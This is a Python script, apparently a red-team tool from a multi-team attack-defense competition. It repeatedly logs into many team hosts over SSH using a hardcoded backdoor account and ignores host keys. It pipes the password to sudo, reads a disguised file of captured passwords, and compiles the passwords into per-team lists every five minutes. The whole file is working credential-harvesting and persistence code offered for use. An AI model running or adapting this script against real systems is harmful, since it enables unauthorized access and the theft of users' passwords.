import paramiko
import threading
import os
import time

username = "irc"
password = "secretpassxd"

team_ips = [
    '10.{}.2.2',
    '10.{}.2.3',
    '10.{}.2.10',
    '10.{}.1.40'
]

cmd_run = "cat /usr/include/type.h"

sleep_mins = 5*60

def mkdir(dirname):
    if not os.path.exists(dirname):
        os.makedirs(dirname)

def run_cmd(host, team_dir):
    ssh = paramiko.SSHClient()
    try:
        ssh.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())
        ssh.connect(host, port=22, username=username, password=password, timeout=10)
        cmd = 'bash -c \'sudo -S -n <<< "{}" bash -c "{}"\''.format(password, cmd_run)
        stdin, stdout, stderr = ssh.exec_command(cmd)
        cmd_output = []
        for line in stdout.readlines():
            cmd_output.append(line.strip().replace("\x00", ""))
        if cmd_output:
            removed_dups = list(dict.fromkeys(cmd_output))
            pass_list = team_dir + "/{}.txt".format(host)
            if os.path.exists(pass_list):
                with open(pass_list, "r") as pass_file, open(pass_list,"a") as write_pass:
                    all_passes = pass_file.read().splitlines()
                    for users_password in removed_dups:
                        if users_password not in all_passes:
                            write_pass.write("{}\n".format(users_password))
                pass_file.close()
                write_pass.close()
            else:
                with open(pass_list, "w") as write_pass:
                    for users_password in removed_dups:
                        write_pass.write("{}\n".format(users_password))
                write_pass.close()
    except Exception as e:
        print("host: {} error: {}".format(ip, e))
    finally:
        if ssh:
            ssh.close()

if __name__ == "__main__":
    while True:
        threads = []
        mkdir("teams")
        last_ran = time.time()
        for team_num in range(1, 9):
            team_dir = "teams/team_{}".format(team_num)
            mkdir(team_dir)
            for linux_server in team_ips:
                ip = linux_server.format(team_num)
                t1 = threading.Thread(target=run_cmd, args=(ip,team_dir,))
                threads.append(t1)
                t1.start()
        for t in threads:
            t.join()
            threads.remove(t)
        while True:
            now_time = time.time()
            if now_time-last_ran < sleep_mins:
                print("Running in: {} Seconds".format(int(sleep_mins-(now_time-last_ran))), end="\r")
            else:
                break
                print()
            time.sleep(1)
